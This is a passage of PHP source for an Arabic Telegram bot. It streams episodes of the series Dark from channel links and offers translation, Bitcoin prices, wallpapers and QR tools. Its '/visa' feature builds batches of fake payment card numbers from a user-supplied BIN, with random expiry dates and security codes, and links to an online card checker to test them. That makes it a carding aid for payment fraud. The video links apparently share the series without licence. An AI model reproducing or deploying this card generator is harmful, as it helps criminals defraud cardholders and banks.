video =>"https://t.me/ggggldjql/220",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id,
]);
}


if($data=="aflam29"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/ggggldjql/221",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}


if($data=="ds2" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Dark, 1','callback_data'=>"d2e1"],['text'=>'Dark , 2','callback_data'=>"d2e2"]],
[['text'=>'Dark, 3','callback_data'=>"d2e3"],['text'=>'Dark, 4','callback_data'=>"d2e4"]],
[['text'=>'Dark- 5','callback_data'=>"d2e5"],['text'=>'Dark- 6','callback_data'=>"d2e6"]],
[['text'=>'Dark- 7','callback_data'=>"d2e7"],['text'=>'Dark- 8','callback_data'=>"d2e8"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"darkk"]],
]
])
]);
}

if($data=="d2e1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/513",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="d2e2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/514",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="d2e3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/515",
'caption'=>" 

تدور أحداث المسلسل حول اختفاء طفل في بلدة صغيرة في ألمانيا، يفضح اختفاء الطفل العديد من الأسرار حول 4 عائلات مرتبطة به وتبدأ الاحداث بالتطور بعديد المفاجئات والتغيرات حتى نكتشف أنَّ لذلك الحدث ارتباط بأحداث حدثت في نفس البلدة في عام 1986، اختفاء الطفل في بلدة ”فيندن“ الألمانية الصغيرة يفتح أبواب الجحيم التي تقلب مفهوم الزمن رأسًا على عقب، والمسألة ليست هوية مَن اختطف الطفلين… بل متى أقدم على اختطافهما.

المدة الزمنية : 52 دقيقة
سنة الانتاج : 2017
اللغة: الالمانية 
الترجمة: العربية
محتوى الفيلم : PG+16
جودة الصورة : HD
تصنيف:: جريمة - دراما- غموض
التقييم الحالي:: 8.6

Dark - S2
الموسم الثاني 👆",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="d2e4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/516",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="d2e5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/517",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="d2e6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/518",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="d2e7"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/519",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="d2e8"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/520",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="ds3" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر الحلقة 💥 🎞
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'Dark, 1','callback_data'=>"d3e1"],['text'=>'Dark , 2','callback_data'=>"d3e2"]],
[['text'=>'Dark, 3','callback_data'=>"d3e3"],['text'=>'Dark, 4','callback_data'=>"d3e4"]],
[['text'=>'Dark- 5','callback_data'=>"d3e5"],['text'=>'Dark- 6','callback_data'=>"d3e6"]],
[['text'=>'Dark- 7','callback_data'=>"d3e7"],['text'=>'Dark- 8','callback_data'=>"d3e8"]],
[['text'=>'𝙱𝙰𝙲𝙺 ➪','callback_data'=>"darkk"]],
]
])
]);
}

if($data=="d3e1"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/522",
'caption'=>" 

 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="d3e2"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/523",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="d3e3"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/524",
'caption'=>" 


Dark - S3
الموسم الثالث 👆",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="d3e4"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/525",
'caption'=>" 
.",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="d3e5"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/526",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="d3e6"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/527",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($data=="d3e7"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/529",
'caption'=>" 
 ",
'reply_to_message_id'=>$message->message_id, 
]);
}

if($data=="d3e8"){
mkdir("zkref/$useree");
file_put_contents("LOrDAhMeD/$useree/LOrDAhMeD.txt","AhMeD");
bot('sendVideo',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id,
video =>"https://t.me/UU_NFS/530",
'caption'=>" 
",
'reply_to_message_id'=>$message->message_id, 
]);
}
$re = $message->reply_to_message;
$txt_id = $message->from->id;
$trans = $update->callback_query->data;
$s = str_replace(' ','%20',$re->text);
$txt = explode("|",$data);
$dec = json_decode(file_get_contents("https://translate.yandex.net/api/v1/tr.json/translate?srv=android&uuid=6f4c351f-e58f-48d2-bda6-3cae1bddcbb4&id=e93642f1-1cd7-479e-9f93-08405027065b-9-0&lang=".$txt[0]."&text=".$txt[1]));
$tr = $dec->text;
if($text== "/tr" or $text=="/tr@wizzaard_bot" and $re){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"قم بأختيار اللغة التي تريد الترجمة اليها 
Choose the language to translate into",
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'🇸🇾 العربية','callback_data' =>"ar|".$s],['text'=>'🇺🇲 الانكليزية','callback_data' =>"en|".$s],['text'=>'🇮🇷 الفارسية','callback_data' =>"fa|".$s]],
[['text'=>'🇷🇺 الروسية','callback_data' =>"ru|".$s],['text'=>'🇯🇵 اليابانية','callback_data' =>"ja|".$s],['text'=>'🇮🇹 الايطالية','callback_data' =>"it|".$s]],
[['text'=>'🇩🇪 الالمانية','callback_data' =>"de|".$s],['text'=>'🇨🇳 الصينية','callback_data' =>"zh|".$s],['text'=>'🇫🇷 الفرنسية','callback_data' =>"fr|".$s]],
[['text'=>'🇹🇷 التركية','callback_data' =>"tr|".$s],['text'=>'🇪🇦 الاسبانية','callback_data' =>"es|".$s],['text'=>'🇮🇳 الهندية','callback_data' =>"hi|".$s]],
[['text'=>'🇺🇦 الأوكرانية','callback_data' =>"uk|".$s]],[['text'=>"™سورس ويزرد",'url'=>"https://t.me/Wizard_system"]],
]])
]);
}
$trarr = array("ar","en","ru","de","tr","uk","ja","zh","es","fa","it","fr","hi");
if(in_array($txt[0],$trarr)){
bot('SendMessage',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
'text'=>"*$tr[0] :النص المترجم*",
'parse_mode'=>"MarkDown",
]);
}
$re = $message->reply_to_message;
$txt_id = $message->from->id;
$btap = json_decode(file_get_contents("https://duckduckgo.com/js/spice/cryptonator/BTC/USD"));
$mik = $btap->ticker->markets[0]->price;
if($text== "/btc" or $text=="/btc@wizzaard_bot" and $re){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"*سعر البيتكوين الآن :* `$mik`",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'تحديث 🔄','callback_data' =>"ref"]],
[['text'=>"™سورس ويزرد",'url'=>"https://t.me/Wizard_system"]],
]])
]);
}
if($data=="ref"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*سعر البيتكوين الآن :* `$mik`",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'تحديث 🔄','callback_data' =>"ref"]],
[['text'=>"™سورس ويزرد",'url'=>"https://t.me/Wizard_system"]],
]])
]);
}
if($update->message){
 $message = $update->message;
$message_id = $update->message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$title = $message->chat->title;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
}
if($update->callback_query){
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$title = $update->callback_query->message->chat->title;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $update->callback_query->from->id;
}
if($text == "خلفيات" or $text == "خلفية" or $text == "خلفيه"){
  
bot('sendphoto', [
'chat_id'=>$chat_id,
'photo'=>file_get_contents("https://dev-yhya.tk/api/photo/index.php"),
'caption'=>"
*@Wizard_System*
",
'parse_mode'=>'MarkDown',
reply_markup=>json_encode([
'inline_keyboard'=>[
[['text'=>"Next 🔄",'callback_data'=>"photo#$from_id"]],
]])
]);
sleep(1);
}
$ex = explode('#',$data);
if($ex[0] == "photo"){
if($ex[1] == $from_id or in_array($from_id,$admins)){
  
  $photo = file_get_contents("https://dev-yhya.tk/api/photo/index.php");
bot('editMessageMedia',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'inline_message_id'=>$update->inline_query->inline_message_id,
'media'=>json_encode([
"type"=>"photo","media"=>$photo,'caption'=>"@Wizard_System"]),
reply_markup=>json_encode([
'inline_keyboard'=>[
[['text'=>"Next 🔄",'callback_data'=>"photo#$from_id"]],
]])
]);
}
}
if($text == '/visa'){
file_put_contents($chat_id,'');
     bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"اهلا بك عزيزي قم بصنع فيزتك الوهمية الخاصة من خلال الاوامر :",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
  [['text'=>'- تعيين الBIN .','callback_data'=>'putbin'],['text'=>'- صنع فيزات .','callback_data'=>'makev']],
  [['text'=>'سورس ويزرد','url'=>'https://t.me/Wizard_system']],
  ],
  ])
  ]);
  }
  if($data=='putbin'){
      file_put_contents($chat_id,'putbin');
      bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"- حسنا عزيزي قم بأرسال الBIN الخاص بك .\n- ملاحظة : يمكنك ارسال BIN متكون من 6 ارقام فقط .\n- مثال على الBIN => 123456 .",
          'parse_mode'=>"markdown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
  [['text'=>'- رجوع .','callback_data'=>'backkk']],
],
])
      ]);
  }
  $brokc = file_get_contents($chat_id);
  if($text and $text != '/start' and $brokc == 'putbin'){
      bot('sendMessage' ,[
          'chat_id'=>$chat_id,
          'text'=>"- حسنا عزيزي تم تعيين $text البن الخاص بك .",
                    'parse_mode'=>"markdown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
  [['text'=>'- رجوع .','callback_data'=>'backkk']],
],
])
      ]);
      file_put_contents("$chat_id.txt",$text);
      unlink($chat_id);
  }
  $bin = file_get_contents("$chat_id.txt"); 
  if($data=='makev' and $bin != ''){
$codes = ['1','2','3','4','5','6','7','8','9','0'];
$code1 = array_rand($codes,1);
$code2 = array_rand($codes,1);
$code3 = array_rand($codes,1);
$code4 = array_rand($codes,1);
$code5 = array_rand($codes,1);
$code6 = array_rand($codes,1);
$code7 = array_rand($codes,1);
$code8 = array_rand($codes,1);
$code9 = array_rand($codes,1);
$code10 = array_rand($codes,1);
$bcode1 = $codes[$code1];
$bcode2 = $codes[$code2];
$bcode3 = $codes[$code3];
$bcode4 = $codes[$code4];
$bcode5 = $codes[$code5];
$bcode6 = $codes[$code6];
$bcode7 = $codes[$code7];
$bcode8 = $codes[$code8];
$bcode9 = $codes[$code9];
$bcode10 = $codes[$code10];
$monthcode = ['01','02','03','04','05','06','07','08','09','10','11','12'];
$montherand = array_rand($monthcode,1);
$monthebrok = $monthcode[$montherand];
$yearcode = ['2022','2023','2024','2025','2026'];
$yearrand = array_rand($yearcode,1);
$yearbrok = $yearcode[$yearrand];
$brok = "$bcode3$bcode10$bcode5";
$bfcode = "$bin$bcode1$bcode2$bcode3$bcode4$bcode5$bcode6$bcode7$bcode8$bcode9$bcode10|$monthebrok|$yearbrok|$brok";
$code1 = array_rand($codes,1);
$code2 = array_rand($codes,1);
$code3 = array_rand($codes,1);
$code4 = array_rand($codes,1);
$code5 = array_rand($codes,1);
$code6 = array_rand($codes,1);
$code7 = array_rand($codes,1);
$code8 = array_rand($codes,1);
$code9 = array_rand($codes,1);
$code10 = array_rand($codes,1);
$bcode1 = $codes[$code1];
$bcode2 = $codes[$code2];
$bcode3 = $codes[$code3];
$bcode4 = $codes[$code4];
$bcode5 = $codes[$code5];
$bcode6 = $codes[$code6];
$bcode7 = $codes[$code7];
$bcode8 = $codes[$code8];
$bcode9 = $codes[$code9];
$bcode10 = $codes[$code10];
$montherand = array_rand($monthcode,1);
$monthebrok = $monthcode[$montherand];
$yearrand = array_rand($yearcode,1);
$yearbrok = $yearcode[$yearrand];
$brok = "$bcode3$bcode10$bcode5";
$bfcode1 = "$bin$bcode1$bcode2$bcode3$bcode4$bcode5$bcode6$bcode7$bcode8$bcode9$bcode10|$monthebrok|$yearbrok|$brok";
$code1 = array_rand($codes,1);
$code2 = array_rand($codes,1);
$code3 = array_rand($codes,1);
$code4 = array_rand($codes,1);
$code5 = array_rand($codes,1);
$code6 = array_rand($codes,1);
$code7 = array_rand($codes,1);
$code8 = array_rand($codes,1);
$code9 = array_rand($codes,1);
$code10 = array_rand($codes,1);
$bcode1 = $codes[$code1];
$bcode2 = $codes[$code2];
$bcode3 = $codes[$code3];
$bcode4 = $codes[$code4];
$bcode5 = $codes[$code5];
$bcode6 = $codes[$code6];
$bcode7 = $codes[$code7];
$bcode8 = $codes[$code8];
$bcode9 = $codes[$code9];
$bcode10 = $codes[$code10];
$montherand = array_rand($monthcode,1);
$monthebrok = $monthcode[$montherand];
$yearrand = array_rand($yearcode,1);
$yearbrok = $yearcode[$yearrand];
$brok = "$bcode3$bcode10$bcode5";
$bfcode2 = "$bin$bcode1$bcode2$bcode3$bcode4$bcode5$bcode6$bcode7$bcode8$bcode9$bcode10|$monthebrok|$yearbrok|$brok";
$code1 = array_rand($codes,1);
$code2 = array_rand($codes,1);
$code3 = array_rand($codes,1);
$code4 = array_rand($codes,1);
$code5 = array_rand($codes,1);
$code6 = array_rand($codes,1);
$code7 = array_rand($codes,1);
$code8 = array_rand($codes,1);
$code9 = array_rand($codes,1);
$code10 = array_rand($codes,1);
$bcode1 = $codes[$code1];
$bcode2 = $codes[$code2];
$bcode3 = $codes[$code3];
$bcode4 = $codes[$code4];
$bcode5 = $codes[$code5];
$bcode6 = $codes[$code6];
$bcode7 = $codes[$code7];
$bcode8 = $codes[$code8];
$bcode9 = $codes[$code9];
$bcode10 = $codes[$code10];
$montherand = array_rand($monthcode,1);
$monthebrok = $monthcode[$montherand];
$yearrand = array_rand($yearcode,1);
$yearbrok = $yearcode[$yearrand];
$brok = "$bcode3$bcode10$bcode5";
$bfcode3 = "$bin$bcode1$bcode2$bcode3$bcode4$bcode5$bcode6$bcode7$bcode8$bcode9$bcode10|$monthebrok|$yearbrok|$brok";
$code1 = array_rand($codes,1);
$code2 = array_rand($codes,1);
$code3 = array_rand($codes,1);
$code4 = array_rand($codes,1);
$code5 = array_rand($codes,1);
$code6 = array_rand($codes,1);
$code7 = array_rand($codes,1);
$code8 = array_rand($codes,1);
$code9 = array_rand($codes,1);
$code10 = array_rand($codes,1);
$bcode1 = $codes[$code1];
$bcode2 = $codes[$code2];
$bcode3 = $codes[$code3];
$bcode4 = $codes[$code4];
$bcode5 = $codes[$code5];
$bcode6 = $codes[$code6];
$bcode7 = $codes[$code7];
$bcode8 = $codes[$code8];
$bcode9 = $codes[$code9];
$bcode10 = $codes[$code10];
$montherand = array_rand($monthcode,1);
$monthebrok = $monthcode[$montherand];
$yearrand = array_rand($yearcode,1);
$yearbrok = $yearcode[$yearrand];
$brok = "$bcode3$bcode10$bcode5";
$bfcode4 = "$bin$bcode1$bcode2$bcode3$bcode4$bcode5$bcode6$bcode7$bcode8$bcode9$bcode10|$monthebrok|$yearbrok|$brok";
$code1 = array_rand($codes,1);
$code2 = array_rand($codes,1);
$code3 = array_rand($codes,1);
$code4 = array_rand($codes,1);
$code5 = array_rand($codes,1);
$code6 = array_rand($codes,1);
$code7 = array_rand($codes,1);
$code8 = array_rand($codes,1);
$code9 = array_rand($codes,1);
$code10 = array_rand($codes,1);
$bcode1 = $codes[$code1];
$bcode2 = $codes[$code2];
$bcode3 = $codes[$code3];
$bcode4 = $codes[$code4];
$bcode5 = $codes[$code5];
$bcode6 = $codes[$code6];
$bcode7 = $codes[$code7];
$bcode8 = $codes[$code8];
$bcode9 = $codes[$code9];
$bcode10 = $codes[$code10];
$montherand = array_rand($monthcode,1);
$monthebrok = $monthcode[$montherand];
$yearrand = array_rand($yearcode,1);
$yearbrok = $yearcode[$yearrand];
$brok = "$bcode3$bcode10$bcode5";
$bfcode5 = "$bin$bcode1$bcode2$bcode3$bcode4$bcode5$bcode6$bcode7$bcode8$bcode9$bcode10|$monthebrok|$yearbrok|$brok";
$code1 = array_rand($codes,1);
$code2 = array_rand($codes,1);
$code3 = array_rand($codes,1);
$code4 = array_rand($codes,1);
$code5 = array_rand($codes,1);
$code6 = array_rand($codes,1);
$code7 = array_rand($codes,1);
$code8 = array_rand($codes,1);
$code9 = array_rand($codes,1);
$code10 = array_rand($codes,1);
$bcode1 = $codes[$code1];
$bcode2 = $codes[$code2];
$bcode3 = $codes[$code3];
$bcode4 = $codes[$code4];
$bcode5 = $codes[$code5];
$bcode6 = $codes[$code6];
$bcode7 = $codes[$code7];
$bcode8 = $codes[$code8];
$bcode9 = $codes[$code9];
$bcode10 = $codes[$code10];
$montherand = array_rand($monthcode,1);
$monthebrok = $monthcode[$montherand];
$yearrand = array_rand($yearcode,1);
$yearbrok = $yearcode[$yearrand];
$brok = "$bcode3$bcode10$bcode5";
$bfcode6 = "$bin$bcode1$bcode2$bcode3$bcode4$bcode5$bcode6$bcode7$bcode8$bcode9$bcode10|$monthebrok|$yearbrok|$brok";
$code1 = array_rand($codes,1);
$code2 = array_rand($codes,1);
$code3 = array_rand($codes,1);
$code4 = array_rand($codes,1);
$code5 = array_rand($codes,1);
$code6 = array_rand($codes,1);
$code7 = array_rand($codes,1);
$code8 = array_rand($codes,1);
$code9 = array_rand($codes,1);
$code10 = array_rand($codes,1);
$bcode1 = $codes[$code1];
$bcode2 = $codes[$code2];
$bcode3 = $codes[$code3];
$bcode4 = $codes[$code4];
$bcode5 = $codes[$code5];
$bcode6 = $codes[$code6];
$bcode7 = $codes[$code7];
$bcode8 = $codes[$code8];
$bcode9 = $codes[$code9];
$bcode10 = $codes[$code10];
$montherand = array_rand($monthcode,1);
$monthebrok = $monthcode[$montherand];
$yearrand = array_rand($yearcode,1);
$yearbrok = $yearcode[$yearrand];
$brok = "$bcode3$bcode10$bcode5";
$bfcode7 = "$bin$bcode1$bcode2$bcode3$bcode4$bcode5$bcode6$bcode7$bcode8$bcode9$bcode10|$monthebrok|$yearbrok|$brok";
$code1 = array_rand($codes,1);
$code2 = array_rand($codes,1);
$code3 = array_rand($codes,1);
$code4 = array_rand($codes,1);
$code5 = array_rand($codes,1);
$code6 = array_rand($codes,1);
$code7 = array_rand($codes,1);
$code8 = array_rand($codes,1);
$code9 = array_rand($codes,1);
$code10 = array_rand($codes,1);
$bcode1 = $codes[$code1];
$bcode2 = $codes[$code2];
$bcode3 = $codes[$code3];
$bcode4 = $codes[$code4];
$bcode5 = $codes[$code5];
$bcode6 = $codes[$code6];
$bcode7 = $codes[$code7];
$bcode8 = $codes[$code8];
$bcode9 = $codes[$code9];
$bcode10 = $codes[$code10];
$montherand = array_rand($monthcode,1);
$monthebrok = $monthcode[$montherand];
$yearrand = array_rand($yearcode,1);
$yearbrok = $yearcode[$yearrand];
$brok = "$bcode3$bcode10$bcode5";
$bfcode8 = "$bin$bcode1$bcode2$bcode3$bcode4$bcode5$bcode6$bcode7$bcode8$bcode9$bcode10|$monthebrok|$yearbrok|$brok";
$code1 = array_rand($codes,1);
$code2 = array_rand($codes,1);
$code3 = array_rand($codes,1);
$code4 = array_rand($codes,1);
$code5 = array_rand($codes,1);
$code6 = array_rand($codes,1);
$code7 = array_rand($codes,1);
$code8 = array_rand($codes,1);
$code9 = array_rand($codes,1);
$code10 = array_rand($codes,1);
$bcode1 = $codes[$code1];
$bcode2 = $codes[$code2];
$bcode3 = $codes[$code3];
$bcode4 = $codes[$code4];
$bcode5 = $codes[$code5];
$bcode6 = $codes[$code6];
$bcode7 = $codes[$code7];
$bcode8 = $codes[$code8];
$bcode9 = $codes[$code9];
$bcode10 = $codes[$code10];
$montherand = array_rand($monthcode,1);
$monthebrok = $monthcode[$montherand];
$yearrand = array_rand($yearcode,1);
$yearbrok = $yearcode[$yearrand];
$brok = "$bcode3$bcode10$bcode5";
$bfcode9 = "$bin$bcode1$bcode2$bcode3$bcode4$bcode5$bcode6$bcode7$bcode8$bcode9$bcode10|$monthebrok|$yearbrok|$brok";
bot ('EditMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"`$bfcode\n$bfcode1\n$bfcode2\n$bfcode3\n$bfcode4\n$bfcode5\n$bfcode6\n$bfcode7\n$bfcode8\n$bfcode9`\n- - - - -\n- BY => @J_69_L .", 
                        'parse_mode'=>"markdown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
  [['text'=>'- صنع فيزات مرة اخرى .','callback_data'=>'makev']],
  [['text'=>'- رجوع .','callback_data'=>'backkk']],
  [['text'=>"- اضغط هنا لفحص الفيزات .",'url'=>"https://www.mrchecker.net/card/ccn2/"]], 
],
])
]);
  }
  if($data=='makev' and $bin == ''){
  	bot('EditMessageText', [
  'chat_id'=>$chat_id, 
  'message_id'=>$message_id, 
  'text'=>"- يجب عليك وضع BIN اولا.",
  'parse_mode'=>"markdown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
  [['text'=>'- تعيين الBIN .','callback_data'=>'putbin']], 
 ], 
])
]);
} 
if($data=='backkk'){
file_put_contents($chat_id,'');
     bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id, 
'text'=>"اهلا بك عزيزي قم بصنع فيزتك الوهمية الخاصة من خلال الاوامر :",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['inline_keyboard'=>[
  [['text'=>'- تعيين الBIN .','callback_data'=>'putbin'],['text'=>'- صنع فيزات .','callback_data'=>'makev']],
  [['text'=>'سورس ويزرد','url'=>'https://t.me/Wizard_system']],
  ],
  ])
  ]);
  }
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$from_id = $message->from->id;
$text = $message->text;


if($text=="/qr" and $re){
bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>"https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=$re->text",
'caption'=>'↗️||تم وضع النص في الصوره
↖️||للتأكد من وجود النص 
↗️||قم بأعاده ارسال الصوره الى البوت',
'parse_mode'=>'MarkDown',
]);
}
if($text=="فك" and $re->photo){ 
$photo = $update->message->photo;
$file_id = $re->photo[0]->file_id;
$getFile = json_decode(file_get_contents("https://api.telegram.org/bot".API_KEY."/getFile?file_id=".$file_id),true);
$result = $getFile["result"];
$file_path = $result["file_path"];
$url = 'https://api.telegram.org/file/bot'.API_KEY.'/'.$file_path;
$Api = json_decode(file_get_contents("https://api.qrserver.com/v1/read-qr-code/?fileurl=".$url),1);
$code = $Api[0]['symbol'][0]['data'];
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"النص الموجود في الصوره هو :\n-----------\n*$code*",
'parse_mode'=>'MarkDown',
]);
}
if($text=="صور عشوائية"){
for($i=1;$i<=4;$i++){
$armof = array("a","b","c","d","e","f");
$b = array_rand($armof,1);
bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>"https://unsplash.com/s/photos/$text.$armof[$b][$i]",
]);
}
}
$update = json_decode(file_get_contents('php://input'));
$php_aba = $update->message;
$text = $php_aba->text;
$f_ppp = $php_aba->chat->id;
$from_id = $php_aba->from->id;
$fn = $php_aba->from->first_name;
$user = $php_aba->from->username;
$join = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$chj&user_id=".$from_id);
$f_ppp2 = $update->callback_query->message->chat->id;
$php_aba_id2 = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$id = $php_aba->from->id;
$text = $php_aba->text;
$user = $php_aba->from->username;
$php_aba = $update->message;
$text = $php_aba->text;
$php_aba_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$from_id = $php_aba->from->id;
$name = $update->message->from->first_name;
$from_id = $php_aba->from->id;
$data = $update->callback_query->data;
$f_ppp2 = $update->callback_query->message->chat->id;
$admin = "296369326"; #ايديك
$ok = file_get_contents("ARMOF.txt");
$ok0 = file_get_contents("ARMOF0.txt");
$ok1= file_get_contents("ARMOF1.txt");
$ok5 = file_get_contents("ARMOF2.txt");
$ok6 = file_get_contents("ARMOF3.txt");
$ok20 = json_decode(file_get_contents('php://input'));
$ok18 = $update->message;
$ok13 = $ok18->chat->id;
$ok17 = $ok18->text;
$meme = $ok20->callback_query->data;
$ok12 = $ok20->callback_query->message->chat->id;
$ok14 =  $ok20->callback_query->message->message_id;
$ok15 = $ok18->from->first_name;
$ok16 = $ok18->from->username;
$ok11 = $ok18->from->id;
$ok2 = explode("\n",file_get_contents("ARMOF4.txt"));
$ok3 = count($ok2)-1;
if ($ok18 && !in_array($ok11, $ok2)) {
    file_put_contents("ARMOF4.txt", $ok11."\n",FILE_APPEND);
  }
$zkrf = file_get_contents("zkrf.txt");
if($text == "زخرفلي"){
bot('sendmessage',[
'chat_id'=>$f_ppp,
'text'=>"*
•🦋| اهلا بك. $name
اهلا بك في قسم الزخرفة
*",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'زخرفه الان 🇸🇾','callback_data'=>'ii']],
[['text'=>"بايو 🦋", 'callback_data'=>'M']],
]
])
]);
}
if($data == "ii" ){
